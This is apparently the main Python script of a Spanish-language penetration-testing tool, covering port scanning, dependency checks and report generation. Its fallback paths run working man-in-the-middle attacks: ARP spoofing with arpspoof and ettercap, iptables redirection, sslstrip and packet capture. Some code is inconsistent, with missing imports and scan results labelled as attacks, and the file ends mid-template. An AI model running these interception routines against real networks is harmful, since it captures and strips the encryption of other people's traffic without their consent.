#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import json
import os
import subprocess
import sys
import time
from datetime import datetime

from utils import get_default_gateway
from utils import get_default_interface
from utils import get_network_interfaces
from utils import load_config

from network_scanner import NetworkScanner
from iot_scanner import IoTScanner
from malware_analyzer import MalwareAnalyzer

VERSION = '1.1.0'
COLORS = {
    'WHITE': '\033[1;37m',
    'GREEN': '\033[1;32m',
    'SUCCESS': '\033[1;32m',
    'INFO': '\033[1;36m',  # Cyan para información
    'WARNING': '\033[1;33m',
    'FAIL': '\033[1;31m',
    'BLUE': '\033[1;34m',
    'PURPLE': '\033[1;35m',  # Púrpura para destacar
    'YELLOW': '\033[1;33m',  # Amarillo brillante
    'RED': '\033[1;31m',     # Rojo brillante
    'CYAN': '\033[1;36m',    # Cyan brillante
    'BOLD': '\033[1m',       # Texto en negrita
    'UNDERLINE': '\033[4m',  # Texto subrayado
    'ENDC': '\033[0m'
}

# Función para mostrar banner
def print_banner():
    banner = f"""
{COLORS['CYAN']}██╗   ██╗███╗   ██╗██╗████████╗██╗   ██╗{COLORS['RED']}██████╗ ███████╗██╗  ██╗{COLORS['ENDC']}
{COLORS['CYAN']}██║   ██║████╗  ██║██║╚══██╔══╝╚██╗ ██╔╝{COLORS['RED']}██╔══██╗██╔════╝╚██╗██╔╝{COLORS['ENDC']}
{COLORS['CYAN']}██║   ██║██╔██╗ ██║██║   ██║    ╚████╔╝ {COLORS['RED']}██║  ██║█████╗   ╚███╔╝ {COLORS['ENDC']}
{COLORS['CYAN']}██║   ██║██║╚██╗██║██║   ██║     ╚██╔╝  {COLORS['RED']}██║  ██║██╔══╝   ██╔██╗ {COLORS['ENDC']}
{COLORS['CYAN']}╚██████╔╝██║ ╚████║██║   ██║      ██║   {COLORS['RED']}██████╔╝███████╗██╔╝ ██╗{COLORS['ENDC']}
{COLORS['CYAN']} ╚═════╝ ╚═╝  ╚═══╝╚═╝   ╚═╝      ╚═╝   {COLORS['RED']}╚═════╝ ╚══════╝╚═╝  ╚═╝{COLORS['ENDC']}

{COLORS['BOLD']}{COLORS['WHITE']}Herramienta avanzada para análisis de seguridad en redes{COLORS['ENDC']}
{COLORS['INFO']}Versión: {VERSION} | Autor: UnityDex Team{COLORS['ENDC']}
{COLORS['YELLOW']}"La seguridad no es un producto, es un proceso"{COLORS['ENDC']}
"""
    print(banner)
    
    # Mostrar fecha y hora actual
    current_time = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    print(f"{COLORS['GREEN']}[+] Fecha y hora: {current_time}{COLORS['ENDC']}")
    
    # Mostrar información del sistema
    try:
        import platform
        system_info = platform.system() + " " + platform.release()
        print(f"{COLORS['GREEN']}[+] Sistema: {system_info}{COLORS['ENDC']}")
    except:
        pass
    
    print("")
    print(f"{COLORS['PURPLE']}{'='*70}{COLORS['ENDC']}")
    print("")

# Función para verificar si se está ejecutando como root
def check_root():
    try:
        import os
        if os.geteuid() != 0:
            print(f"{COLORS['FAIL']}[!] UnityDex debe ser ejecutado como root{COLORS['ENDC']}")
            sys.exit(0)
    except:
        pass

# Función para verificar si se está ejecutando en Kali Linux
def check_kali():
    try:
        import os
        import platform
        # Verificar si es Linux
        if platform.system() != 'Linux':
            print(f"{COLORS['WARNING']}[!] UnityDex está diseñado para Linux, algunas funciones pueden no estar disponibles{COLORS['ENDC']}")
            print(f"{COLORS['INFO']}[i] Si estás en Windows, considera usar WSL o una máquina virtual con Kali Linux{COLORS['ENDC']}")
            return False
        
        # Intentar detectar si es Kali Linux
        try:
            with open('/etc/os-release', 'r') as f:
                content = f.read().lower()
                if 'kali' in content:
                    print(f"{COLORS['SUCCESS']}[+] Kali Linux detectado. Todas las funciones están disponibles{COLORS['ENDC']}")
                    return True
                else:
                    # Extraer el nombre de la distribución para informar al usuario
                    import re
                    distro_name = re.search(r'name="?([^"]*)"?', content)
                    distro = distro_name.group(1) if distro_name else "desconocida"
                    print(f"{COLORS['WARNING']}[!] Estás ejecutando {distro}, no Kali Linux{COLORS['ENDC']}")
                    print(f"{COLORS['INFO']}[i] Algunas herramientas específicas de Kali pueden no estar disponibles{COLORS['ENDC']}")
                    print(f"{COLORS['INFO']}[i] Ejecuta ./install_kali.sh para instalar las dependencias necesarias{COLORS['ENDC']}")
        except FileNotFoundError:
            print(f"{COLORS['WARNING']}[!] No se pudo determinar la distribución Linux{COLORS['ENDC']}")
            print(f"{COLORS['INFO']}[i] Se recomienda usar Kali Linux para todas las funcionalidades{COLORS['ENDC']}")
        
        return True
    except Exception as e:
        print(f"{COLORS['WARNING']}[!] No se pudo verificar el sistema operativo: {str(e)}{COLORS['ENDC']}")
        return True  # Continuar de todos modos

# Función para verificar dependencias
def check_dependencies():
    missing_bins = []
    missing_modules = []
    optional_bins = []
    optional_modules = []
    
    # Verificar dependencias críticas
    try:
        import os
        import shutil
        
        # Verificar binarios esenciales
        essential_bins = [
            'nmap',          # Escaneo de red
            'tcpdump',       # Captura de paquetes
            'python3',       # Intérprete Python
            'pip3'           # Gestor de paquetes Python
        ]
        
        for binary in essential_bins:
            if shutil.which(binary) is None:
                missing_bins.append(binary)
        
        # Verificar binarios opcionales pero recomendados
        optional_bin_list = [
            'wireshark',     # Análisis de tráfico
            'tshark',        # Wireshark CLI
            'aircrack-ng',   # Análisis WiFi
            'yara',          # Análisis de malware
            'sqlmap',        # Análisis de vulnerabilidades SQL
            'hydra',         # Ataques de fuerza bruta
            'metasploit'     # Framework de explotación
        ]
        
        for binary in optional_bin_list:
            if shutil.which(binary) is None:
                optional_bins.append(binary)
        
        # Verificar módulos Python esenciales
        essential_modules = [
            'requests',      # Peticiones HTTP
            'scapy',         # Manipulación de paquetes
            'paramiko',      # Conexiones SSH
            'colorama'       # Colores en terminal
        ]
        
        for module in essential_modules:
            try:
                __import__(module)
            except ImportError:
                missing_modules.append(module)
        
        # Verificar módulos Python opcionales
        optional_module_list = [
            'python-nmap',    # Interfaz para nmap
            'pyOpenSSL',     # Análisis SSL/TLS
            'cryptography',  # Funciones criptográficas
            'matplotlib',    # Gráficos
            'pandas',        # Análisis de datos
            'beautifulsoup4', # Análisis HTML
            'pypcap',        # Captura de paquetes
            'pefile',        # Análisis de ejecutables
            'yara-python',   # Reglas YARA
            'ssdeep',        # Fuzzy hashing
            'vulners'        # Base de datos de vulnerabilidades
        ]
        
        for module in optional_module_list:
            try:
                module_name = module.replace('-', '_')
                __import__(module_name)
            except ImportError:
                optional_modules.append(module)
        
        # Mostrar resultados
        all_ok = True
        
        if missing_bins:
            print(f"{COLORS['FAIL']}[!] Faltan binarios esenciales: {', '.join(missing_bins)}{COLORS['ENDC']}")
            print(f"{COLORS['INFO']}[*] Instale con: sudo apt update && sudo apt install {' '.join(missing_bins)}{COLORS['ENDC']}")
            all_ok = False
        
        if missing_modules:
            print(f"{COLORS['FAIL']}[!] Faltan módulos Python esenciales: {', '.join(missing_modules)}{COLORS['ENDC']}")
            print(f"{COLORS['INFO']}[*] Instale con: pip3 install {' '.join(missing_modules)}{COLORS['ENDC']}")
            all_ok = False
        
        if optional_bins:
            print(f"{COLORS['WARNING']}[!] Herramientas opcionales no encontradas: {', '.join(optional_bins)}{COLORS['ENDC']}")
            print(f"{COLORS['INFO']}[*] Algunas funciones avanzadas pueden no estar disponibles{COLORS['ENDC']}")
            print(f"{COLORS['INFO']}[*] Para instalar: sudo apt install {' '.join(optional_bins)}{COLORS['ENDC']}")
        
        if optional_modules:
            print(f"{COLORS['WARNING']}[!] Módulos Python opcionales no encontrados: {', '.join(optional_modules)}{COLORS['ENDC']}")
            print(f"{COLORS['INFO']}[*] Para instalar: pip3 install {' '.join(optional_modules)}{COLORS['ENDC']}")
        
        if all_ok:
            print(f"{COLORS['SUCCESS']}[+] Todas las dependencias esenciales están instaladas{COLORS['ENDC']}")
            if not optional_bins and not optional_modules:
                print(f"{COLORS['SUCCESS']}[+] Todas las dependencias opcionales están instaladas{COLORS['ENDC']}")
        
        # Sugerir script de instalación
        if not all_ok or optional_bins or optional_modules:
            print(f"{COLORS['INFO']}[i] Ejecute ./install_kali.sh para instalar todas las dependencias automáticamente{COLORS['ENDC']}")
        
        return all_ok
    except Exception as e:
        print(f"{COLORS['FAIL']}[!] Error al verificar dependencias: {str(e)}{COLORS['ENDC']}")
        return False

# Función para modo interactivo
def interactive_mode():
    # Importar la implementación completa desde el módulo interactive_mode
    from interactive_mode import interactive_mode as im
    return im()

# Función para escaneo de red
def network_scan(target, method):
    print(f"{COLORS['BLUE']}[*] Iniciando escaneo de red en {target} con método {method}{COLORS['ENDC']}")
    
    try:
        # Crear directorio de resultados si no existe
        output_dir = 'results'
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
        
        # Obtener la interfaz de red predeterminada
        interface = get_default_interface()
        if not interface:
            print(f"{COLORS['FAIL']}[!] No se pudo detectar la interfaz de red{COLORS['ENDC']}")
            return
        
        # Obtener el gateway predeterminado
        gateway = get_default_gateway()
        if not gateway:
            print(f"{COLORS['FAIL']}[!] No se pudo detectar el gateway{COLORS['ENDC']}")
            return
        
        # Realizar escaneo según el método seleccionado
        if method == 'quick':
            print(f"{COLORS['INFO']}[*] Realizando escaneo rápido{COLORS['ENDC']}")
            scanner = NetworkScanner(target)
            results = scanner.quick_scan()
        elif method == 'full':
            print(f"{COLORS['INFO']}[*] Realizando escaneo completo{COLORS['ENDC']}")
            scanner = NetworkScanner(target)
            results = scanner.full_scan()
        elif method == 'vuln':
            print(f"{COLORS['INFO']}[*] Realizando escaneo de vulnerabilidades{COLORS['ENDC']}")
            network_vulnerability_scan(target, 'full')
            return
        
        if results:
            # Mostrar resultados
            print(f"\n{COLORS['GREEN']}[+] Ataque completado{COLORS['ENDC']}")
            print(f"Duración: {results['duration']:.2f} segundos")
            
            # Mostrar ruta de los informes
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            json_file = os.path.join(output_dir, f"mitm_attack_{timestamp}.json")
            html_file = os.path.join(output_dir, f"mitm_report_{timestamp}.html")
            
            print(f"\n{COLORS['GREEN']}[+] Informes generados:{COLORS['ENDC']}")
            print(f"  - JSON: {json_file}")
            print(f"  - HTML: {html_file}")
            
            if results.get('packet_capture') and results.get('capture_file'):
                print(f"  - Captura: {results['capture_file']}")
            
            if 'sslstrip_log' in results:
                print(f"  - SSL Strip Log: {results['sslstrip_log']}")
        else:
            print(f"{COLORS['FAIL']}[!] Error durante el ataque{COLORS['ENDC']}")
    except ImportError:
        print(f"{COLORS['FAIL']}[!] No se pudo importar el módulo de ataques MITM{COLORS['ENDC']}")
        print(f"{COLORS['WARNING']}[!] Usando método alternativo{COLORS['ENDC']}")
        
        try:
            # Habilitar el reenvío de IP
            print(f"{COLORS['GREEN']}[+] Habilitando reenvío de IP{COLORS['ENDC']}")
            subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], check=True)
            
            # Iniciar ARP spoofing
            print(f"{COLORS['GREEN']}[+] Iniciando ARP spoofing entre {target} y {gateway}{COLORS['ENDC']}")
            arpspoof_target = subprocess.Popen(['arpspoof', '-i', interface, '-t', target, gateway])
            arpspoof_gateway = subprocess.Popen(['arpspoof', '-i', interface, '-t', gateway, target])
            
            # Iniciar captura de paquetes
            print(f"{COLORS['GREEN']}[+] Iniciando captura de paquetes (Ctrl+C para detener){COLORS['ENDC']}")
            subprocess.run(['tcpdump', '-i', interface, '-n', '-v'], check=True)
        except KeyboardInterrupt:
            print(f"{COLORS['GREEN']}[+] Ataque detenido{COLORS['ENDC']}")
        except subprocess.CalledProcessError:
            print(f"{COLORS['FAIL']}[!] Error durante el ataque{COLORS['ENDC']}")
        finally:
            # Detener ARP spoofing y restaurar configuración
            try:
                arpspoof_target.terminate()
                arpspoof_gateway.terminate()
                subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=0'], check=True)
                print(f"{COLORS['GREEN']}[+] Configuración restaurada{COLORS['ENDC']}")
            except:
                print(f"{COLORS['FAIL']}[!] Error al restaurar la configuración{COLORS['ENDC']}")
    except Exception as e:
        print(f"{COLORS['FAIL']}[!] Error durante el ataque: {str(e)}{COLORS['ENDC']}")

# Función para análisis de tráfico SSL/TLS
def ssl_analysis(interface, target, gateway=None, attack_type='ettercap', duration=None):
    print(f"{COLORS['BLUE']}[*] Iniciando análisis de tráfico SSL/TLS{COLORS['ENDC']}")
    print(f"{COLORS['WARNING']}[!] Esta función debe usarse solo en entornos controlados y con autorización{COLORS['ENDC']}")
    
    try:
        # Importar el módulo de ataques MITM
        from mitm_attack import perform_mitm_attack
        
        # Obtener gateway si no se proporciona
        if not gateway:
            try:
                from utils import get_default_gateway
                gateway = get_default_gateway()
                print(f"{COLORS['GREEN']}[+] Gateway detectado: {gateway}{COLORS['ENDC']}")
            except:
                print(f"{COLORS['FAIL']}[!] No se pudo detectar el gateway. Por favor, especifíquelo manualmente.{COLORS['ENDC']}")
                return
        
        # Crear directorio de resultados si no existe
        output_dir = 'results'
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
        
        # Iniciar ataque MITM con SSL stripping
        print(f"{COLORS['GREEN']}[+] Iniciando análisis SSL/TLS con {attack_type}{COLORS['ENDC']}")
        results = perform_mitm_attack(
            interface=interface,
            gateway_ip=gateway,
            target_ip=target,
            attack_type=attack_type,
            ssl_strip=True,  # Siempre habilitado para análisis SSL
            dns_spoof=False,
            packet_capture=True,
            duration=duration
        )
        
        if results:
            # Mostrar resultados
            print(f"\n{COLORS['GREEN']}[+] Análisis completado{COLORS['ENDC']}")
            print(f"Duración: {results['duration']:.2f} segundos")
            
            # Mostrar ruta de los informes
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            json_file = os.path.join(output_dir, f"ssl_analysis_{timestamp}.json")
            html_file = os.path.join(output_dir, f"ssl_report_{timestamp}.html")
            
            print(f"\n{COLORS['GREEN']}[+] Informes generados:{COLORS['ENDC']}")
            print(f"  - JSON: {json_file}")
            print(f"  - HTML: {html_file}")
            
            if 'sslstrip_log' in results:
                print(f"  - SSL Strip Log: {results['sslstrip_log']}")
                print(f"\n{COLORS['GREEN']}[+] Información SSL capturada:{COLORS['ENDC']}")
                
                # Mostrar información SSL capturada si está disponible
                if 'ssl_info' in results and results['ssl_info']:
                    for i, info in enumerate(results['ssl_info'], 1):
                        print(f"  {i}. Host: {info.get('host', 'N/A')}")
                        print(f"     Protocolo: {info.get('protocol', 'N/A')}")
                        print(f"     Cifrado: {info.get('cipher', 'N/A')}")
                        if 'certificate' in info:
                            print(f"     Certificado: {info['certificate'].get('issuer', 'N/A')}")
                            print(f"     Válido hasta: {info['certificate'].get('valid_until', 'N/A')}")
        else:
            print(f"{COLORS['FAIL']}[!] Error durante el análisis{COLORS['ENDC']}")
    except ImportError:
        print(f"{COLORS['FAIL']}[!] No se pudo importar el módulo de ataques MITM{COLORS['ENDC']}")
        print(f"{COLORS['WARNING']}[!] Usando método alternativo{COLORS['ENDC']}")
        
        try:
            # Habilitar el reenvío de IP
            print(f"{COLORS['GREEN']}[+] Habilitando reenvío de IP{COLORS['ENDC']}")
            subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], check=True)
            
            # Configurar iptables para redirigir el tráfico
            print(f"{COLORS['GREEN']}[+] Configurando redirección de tráfico{COLORS['ENDC']}")
            subprocess.run(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--destination-port', '80', '-j', 'REDIRECT', '--to-port', '8080'], check=True)
            
            # Iniciar sslstrip
            print(f"{COLORS['GREEN']}[+] Iniciando SSLstrip{COLORS['ENDC']}")
            sslstrip_process = subprocess.Popen(['sslstrip', '-l', '8080'], stdout=subprocess.PIPE)
            
            # Iniciar ettercap para ARP spoofing
            print(f"{COLORS['GREEN']}[+] Iniciando ARP spoofing con Ettercap{COLORS['ENDC']}")
            ettercap_cmd = ['ettercap', '-T', '-q', '-i', interface, '-M', 'arp:remote', '/', target, '//']
            ettercap_process = subprocess.Popen(ettercap_cmd, stdout=subprocess.PIPE)
            
            print(f"{COLORS['GREEN']}[+] Análisis en curso (Ctrl+C para detener){COLORS['ENDC']}")
            
            # Esperar a que el usuario detenga el análisis
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"{COLORS['GREEN']}[+] Análisis detenido{COLORS['ENDC']}")
        except subprocess.CalledProcessError:
            print(f"{COLORS['FAIL']}[!] Error durante el análisis{COLORS['ENDC']}")
        finally:
            # Detener procesos y restaurar configuración
            try:
                sslstrip_process.terminate()
                ettercap_process.terminate()
                subprocess.run(['iptables', '-t', 'nat', '-D', 'PREROUTING', '-p', 'tcp', '--destination-port', '80', '-j', 'REDIRECT', '--to-port', '8080'], check=True)
                subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=0'], check=True)
                print(f"{COLORS['GREEN']}[+] Configuración restaurada{COLORS['ENDC']}")
            except:
                print(f"{COLORS['FAIL']}[!] Error al restaurar la configuración{COLORS['ENDC']}")
    except Exception as e:
        print(f"{COLORS['FAIL']}[!] Error durante el análisis: {str(e)}{COLORS['ENDC']}")

# Función para escaneo de puertos avanzado
def advanced_port_scan(target, ports=None, timing=3, scan_type='tcp', service_detection=True, os_detection=True, output_dir='results'):
    print(f"{COLORS['BLUE']}[*] Iniciando escaneo de puertos avanzado en {target}{COLORS['ENDC']}")
    
    try:
        # Importar el módulo de escaneo de red
        from network_scanner import NetworkScanner
        
        # Crear directorio de resultados si no existe
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
        
        # Inicializar el escáner
        scanner = NetworkScanner()
        
        # Configurar opciones de escaneo
        port_list = None
        if ports:
            # Convertir string de puertos a lista
            try:
                if ',' in ports:
                    port_list = [int(p.strip()) for p in ports.split(',')]
                elif '-' in ports:
                    start, end = map(int, ports.split('-'))
                    port_list = list(range(start, end + 1))
                else:
                    port_list = [int(ports)]
            except ValueError:
                print(f"{COLORS['FAIL']}[!] Formato de puertos inválido. Usando puertos predeterminados.{COLORS['ENDC']}")
        
        # Iniciar escaneo
        print(f"{COLORS['GREEN']}[+] Iniciando escaneo de puertos {scan_type.upper()} en {target}{COLORS['ENDC']}")
        
        if scan_type.lower() == 'tcp':
            results = scanner.scan_ports(target, port_list=port_list, scan_type='tcp', workers=10)
        elif scan_type.lower() == 'udp':
            results = scanner.scan_ports(target, port_list=port_list, scan_type='udp', workers=5)
        elif scan_type.lower() == 'both':
            print(f"{COLORS['GREEN']}[+] Escaneando puertos TCP...{COLORS['ENDC']}")
            tcp_results = scanner.scan_ports(target, port_list=port_list, scan_type='tcp', workers=10)
            print(f"{COLORS['GREEN']}[+] Escaneando puertos UDP...{COLORS['ENDC']}")
            udp_results = scanner.scan_ports(target, port_list=port_list, scan_type='udp', workers=5)
            results = {'tcp': tcp_results, 'udp': udp_results}
        else:
            print(f"{COLORS['FAIL']}[!] Tipo de escaneo no válido. Usando TCP.{COLORS['ENDC']}")
            results = scanner.scan_ports(target, port_list=port_list, scan_type='tcp', workers=10)
        
        # Detección de servicios
        if service_detection and results:
            print(f"{COLORS['GREEN']}[+] Detectando servicios en puertos abiertos...{COLORS['ENDC']}")
            service_results = scanner.detect_services(target, results)
            
            # Mostrar resultados de servicios
            if service_results:
                print(f"\n{COLORS['GREEN']}[+] Servicios detectados:{COLORS['ENDC']}")
                for port, service in service_results.items():
                    print(f"  Puerto {port}: {service}")
        
        # Detección de sistema operativo
        if os_detection:
            print(f"{COLORS['GREEN']}[+] Detectando sistema operativo...{COLORS['ENDC']}")
            os_result = scanner.detect_os(target)
            
            if os_result:
                print(f"\n{COLORS['GREEN']}[+] Sistema operativo detectado:{COLORS['ENDC']}")
                print(f"  {os_result}")
        
        # Generar informe
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        json_file = os.path.join(output_dir, f"portscan_{timestamp}.json")
        txt_file = os.path.join(output_dir, f"portscan_{timestamp}.txt")
        
        # Guardar resultados
        scan_data = {
            'target': target,
            'timestamp': timestamp,
            'scan_type': scan_type,
            'results': results
        }
        
        if 'service_results' in locals():
            scan_data['services'] = service_results
        
        if 'os_result' in locals() and os_result:
            scan_data['os'] = os_result
        
        # Guardar en JSON
        with open(json_file, 'w') as f:
            json.dump(scan_data, f, indent=4)
        
        # Guardar en TXT
        with open(txt_file, 'w') as f:
            f.write(f"Escaneo de puertos en {target}\n")
            f.write(f"Fecha: {timestamp}\n")
            f.write(f"Tipo de escaneo: {scan_type.upper()}\n\n")
            
            if scan_type.lower() == 'both':
                f.write("Puertos TCP abiertos:\n")
                for port in results['tcp']:
                    f.write(f"  {port}")
                    if 'service_results' in locals() and port in service_results:
                        f.write(f": {service_results[port]}")
                    f.write("\n")
                
                f.write("\nPuertos UDP abiertos:\n")
                for port in results['udp']:
                    f.write(f"  {port}")
                    if 'service_results' in locals() and port in service_results:
                        f.write(f": {service_results[port]}")
                    f.write("\n")
            else:
                f.write("Puertos abiertos:\n")
                for port in results:
                    f.write(f"  {port}")
                    if 'service_results' in locals() and port in service_results:
                        f.write(f": {service_results[port]}")
                    f.write("\n")
            
            if 'os_result' in locals() and os_result:
                f.write(f"\nSistema operativo: {os_result}\n")
        
        print(f"\n{COLORS['GREEN']}[+] Escaneo completado{COLORS['ENDC']}")
        print(f"\n{COLORS['GREEN']}[+] Informes generados:{COLORS['ENDC']}")
        print(f"  - JSON: {json_file}")
        print(f"  - TXT: {txt_file}")
    except ImportError:
        print(f"{COLORS['FAIL']}[!] No se pudo importar el módulo de escaneo de red{COLORS['ENDC']}")
        print(f"{COLORS['WARNING']}[!] Usando método alternativo{COLORS['ENDC']}")
        
        try:
            # Construir comando nmap
            cmd = ['nmap', '-v']
            
            # Añadir opciones según parámetros
            if timing:
                cmd.extend(['-T', str(timing)])
            
            if ports:
                cmd.extend(['-p', ports])
            else:
                cmd.append('-p-')  # Todos los puertos
            
            # Añadir detección de servicios y sistema operativo
            cmd.extend(['-A', target])
            
            # Ejecutar nmap
            print(f"{COLORS['GREEN']}[+] Ejecutando: {' '.join(cmd)}{COLORS['ENDC']}")
            subprocess.run(cmd, check=True)
        except KeyboardInterrupt:
            print(f"{COLORS['GREEN']}[+] Escaneo detenido{COLORS['ENDC']}")
        except subprocess.CalledProcessError:
            print(f"{COLORS['FAIL']}[!] Error durante el escaneo{COLORS['ENDC']}")
    except Exception as e:
        print(f"{COLORS['FAIL']}[!] Error durante el escaneo: {str(e)}{COLORS['ENDC']}")

# Función para generar informes
def generate_report(output_file, include_system=True, include_network=True, include_scans=True, include_vulns=True):
    '''
    Genera un informe completo con los resultados de los análisis realizados
    
    Args:
        output_file (str): Ruta del archivo de salida
        include_system (bool): Incluir información del sistema
        include_network (bool): Incluir información de red
        include_scans (bool): Incluir resultados de escaneos
        include_vulns (bool): Incluir análisis de vulnerabilidades
    
    Returns:
        bool: True si el informe se generó correctamente, False en caso contrario
    '''
    print(f"{COLORS['BLUE']}[*] Generando informe{COLORS['ENDC']}")
    
    try:
        # Crear directorio si no existe
        output_dir = os.path.dirname(output_file)
        if output_dir and not os.path.exists(output_dir):
            os.makedirs(output_dir)
        
        report = {
            'timestamp': datetime.now().timestamp(),
            'date': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'tool_version': VERSION
        }
        
        # Recopilar información del sistema
        if include_system:
            print(f"{COLORS['GREEN']}[+] Recopilando información del sistema{COLORS['ENDC']}")
            try:
                from utils import get_system_info
                system_info = get_system_info()
            except ImportError:
                system_info = {
                    'hostname': socket.gethostname(),
                    'ip': socket.gethostbyname(socket.gethostname()),
                    'os': platform.system() + ' ' + platform.release(),
                    'date': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'python_version': platform.python_version(),
                    'user': os.getlogin()
                }
            report['system_info'] = system_info
        
        # Recopilar información de red
        if include_network:
            print(f"{COLORS['GREEN']}[+] Recopilando información de red{COLORS['ENDC']}")
            try:
                from utils import get_network_interfaces, get_default_gateway
                network_info = {
                    'interfaces': get_network_interfaces(),
                    'default_gateway': get_default_gateway()
                }
            except ImportError:
                network_info = {}
                try:
                    interfaces = netifaces.interfaces()
                    network_info['interfaces'] = {}
                    for interface in interfaces:
                        addrs = netifaces.ifaddresses(interface)
                        if netifaces.AF_INET in addrs:
                            network_info['interfaces'][interface] = addrs[netifaces.AF_INET][0]
                        if netifaces.AF_LINK in addrs:
                            network_info['interfaces'][interface]['mac'] = addrs[netifaces.AF_LINK][0]['addr']
                    
                    gws = netifaces.gateways()
                    if 'default' in gws and netifaces.AF_INET in gws['default']:
                        network_info['default_gateway'] = gws['default'][netifaces.AF_INET][0]
                except Exception as e:
                    network_info['error'] = f"No se pudo obtener información de red: {str(e)}"
            report['network_info'] = network_info
        
        # Recopilar resultados de escaneos anteriores
        if include_scans:
            print(f"{COLORS['GREEN']}[+] Recopilando resultados de escaneos anteriores{COLORS['ENDC']}")
            scan_results = {
                'network_scans': [],
                'port_scans': [],
                'web_scans': [],
                'wireless_scans': [],
                'mitm_attacks': [],
                'ssl_analysis': [],
                'dictionary_attacks': []
            }
            
            # Buscar archivos JSON en el directorio de resultados
            results_dir = 'results'
            if os.path.exists(results_dir):
                for file in os.listdir(results_dir):
                    if file.endswith('.json'):
                        file_path = os.path.join(results_dir, file)
                        try:
                            with open(file_path, 'r') as f:
                                data = json.load(f)
                            
                            # Clasificar según el nombre del archivo
                            if 'network_scan' in file:
                                scan_results['network_scans'].append(data)
                            elif 'portscan' in file:
                                scan_results['port_scans'].append(data)
                            elif 'web_scan' in file:
                                scan_results['web_scans'].append(data)
                            elif 'wireless_scan' in file:
                                scan_results['wireless_scans'].append(data)
                            elif 'mitm_attack' in file:
                                scan_results['mitm_attacks'].append(data)
                            elif 'ssl_analysis' in file:
                                scan_results['ssl_analysis'].append(data)
                            elif 'dictionary_attack' in file:
                                scan_results['dictionary_attacks'].append(data)
                        except Exception as e:
                            print(f"{COLORS['WARNING']}[!] Error al leer {file}: {str(e)}{COLORS['ENDC']}")
            report['scan_results'] = scan_results
        
        # Recopilar información de vulnerabilidades
        if include_vulns:
            print(f"{COLORS['GREEN']}[+] Analizando vulnerabilidades{COLORS['ENDC']}")
            vulnerabilities = []
            
            # Analizar resultados de escaneos para identificar vulnerabilidades
            if 'scan_results' in report:
                # Vulnerabilidades de puertos abiertos
                for scan in report['scan_results']['port_scans']:
                    if 'results' in scan:
                        results = scan['results']
                        target = scan.get('target', 'desconocido')
                        
                        # Comprobar puertos comúnmente vulnerables
                        vulnerable_ports = {21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 
                                          80: 'HTTP', 443: 'HTTPS', 3306: 'MySQL', 5432: 'PostgreSQL'}
                        
                        if isinstance(results, dict) and 'tcp' in results:
                            # Formato para 'both'
                            for port in results['tcp']:
                                port_num = int(port)
                                if port_num in vulnerable_ports:
                                    vulnerabilities.append({
                                        'type': 'open_port',
                                        'severity': 'medium',
                                        'target': target,
                                        'details': f"Puerto {port_num} ({vulnerable_ports[port_num]}) abierto",
                                        'recommendation': f"Verificar si el servicio {vulnerable_ports[port_num]} es necesario y está actualizado"
                                    })
                        elif isinstance(results, list):
                            # Formato para 'tcp' o 'udp'
                            for port in results:
                                port_num = int(port)
                                if port_num in vulnerable_ports:
                                    vulnerabilities.append({
                                        'type': 'open_port',
                                        'severity': 'medium',
                                        'target': target,
                                        'details': f"Puerto {port_num} ({vulnerable_ports[port_num]}) abierto",
                                        'recommendation': f"Verificar si el servicio {vulnerable_ports[port_num]} es necesario y está actualizado"
                                    })
                
                # Vulnerabilidades web
                for scan in report['scan_results']['web_scans']:
                    if 'vulnerabilities' in scan:
                        for vuln in scan['vulnerabilities']:
                            vulnerabilities.append({
                                'type': vuln.get('type', 'web'),
                                'severity': vuln.get('severity', 'high'),
                                'target': scan.get('target', 'desconocido'),
                                'details': vuln.get('details', ''),
                                'recommendation': vuln.get('recommendation', 'Corregir la vulnerabilidad')
                            })
                
                # Vulnerabilidades de redes inalámbricas
                for scan in report['scan_results']['wireless_scans']:
                    if 'networks' in scan:
                        for network in scan['networks']:
                            if network.get('Encryption key') == 'off' or network.get('Encryption key') == 'No':
                                vulnerabilities.append({
                                    'type': 'wireless',
                                    'severity': 'critical',
                                    'target': network.get('ESSID', 'desconocido'),
                                    'details': f"Red inalámbrica sin cifrado",
                                    'recommendation': "Configurar cifrado WPA2 o WPA3"
                                })
                            elif 'WEP' in str(network.get('Encryption key', '')):
                                vulnerabilities.append({
                                    'type': 'wireless',
                                    'severity': 'high',
                                    'target': network.get('ESSID', 'desconocido'),
                                    'details': f"Red inalámbrica con cifrado WEP (inseguro)",
                                    'recommendation': "Actualizar a WPA2 o WPA3"
                                })
                
                # Vulnerabilidades de ataques de diccionario
                for attack in report['scan_results']['dictionary_attacks']:
                    if 'credentials_found' in attack and attack['credentials_found']:
                        vulnerabilities.append({
                            'type': 'weak_credentials',
                            'severity': 'critical',
                            'target': attack.get('target', 'desconocido'),
                            'details': f"Credenciales débiles encontradas para {attack.get('service', 'desconocido')}",
                            'recommendation': "Cambiar contraseñas y utilizar contraseñas fuertes y únicas"
                        })
            
            report['vulnerabilities'] = vulnerabilities
        
        # Guardar informe en JSON
        with open(output_file, 'w') as f:
            json.dump(report, f, indent=4)
        
        # Generar informe HTML si la extensión es .html
        if output_file.endswith('.html'):
            html_report = generate_html_report(report)
            with open(output_file, 'w') as f:
                f.write(html_report)
        
        print(f"{COLORS['GREEN']}[+] Informe generado: {output_file}{COLORS['ENDC']}")
        return report
    except Exception as e:
        print(f"{COLORS['FAIL']}[!] Error al generar informe: {str(e)}{COLORS['ENDC']}")
        return None

# Función para generar informe HTML
def generate_html_report(report_data):
    print(f"{COLORS['GREEN']}[+] Generando informe HTML{COLORS['ENDC']}")
    
    # Crear plantilla HTML básica
    html = f'''
    <!DOCTYPE html>
